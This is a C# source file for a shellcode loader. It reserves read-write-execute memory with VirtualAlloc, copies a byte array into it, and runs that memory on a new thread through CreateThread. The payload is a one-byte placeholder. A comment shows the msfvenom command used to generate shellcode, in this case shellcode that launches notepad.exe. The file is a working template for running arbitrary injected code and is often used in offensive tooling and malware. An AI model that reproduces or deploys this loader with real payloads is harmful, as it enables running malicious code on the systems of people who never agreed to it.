using System;
using System.Runtime.InteropServices;

namespace NetShellcodeLoader
    {
        class Program
        {
            static void Main(string[] args)
            {
                // msfvenom -p windows/x64/exec CMD="notepad.exe" -f csharp
                byte[] x64shellcode = new byte[1] {0x90};

                IntPtr funcAddr = VirtualAlloc(
                                  IntPtr.Zero,
                                  (ulong)x64shellcode.Length,
                                  (uint)StateEnum.MEM_COMMIT,
                                  (uint)Protection.PAGE_EXECUTE_READWRITE);
                Marshal.Copy(x64shellcode, 0, (IntPtr)(funcAddr), x64shellcode.Length);

                IntPtr hThread = IntPtr.Zero;
                uint threadId = 0;
                IntPtr pinfo = IntPtr.Zero;

                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
                return;
            }

            #region pinvokes
            [DllImport("kernel32.dll")]
            private static extern IntPtr VirtualAlloc(
                IntPtr lpStartAddr,
                ulong size,
                uint flAllocationType,
                uint flProtect);

            [DllImport("kernel32.dll")]
            private static extern IntPtr CreateThread(
                uint lpThreadAttributes,
                uint dwStackSize,
                IntPtr lpStartAddress,
                IntPtr param,
                uint dwCreationFlags,
                ref uint lpThreadId);

            [DllImport("kernel32.dll")]
            private static extern uint WaitForSingleObject(
                IntPtr hHandle,
                uint dwMilliseconds);

            public enum StateEnum
            {
                MEM_COMMIT = 0x1000,
                MEM_RESERVE = 0x2000,
                MEM_FREE = 0x10000
            }

            public enum Protection
            {
                PAGE_READONLY = 0x02,
                PAGE_READWRITE = 0x04,
                PAGE_EXECUTE = 0x10,
                PAGE_EXECUTE_READ = 0x20,
                PAGE_EXECUTE_READWRITE = 0x40,
            }
            #endregion
        }
    }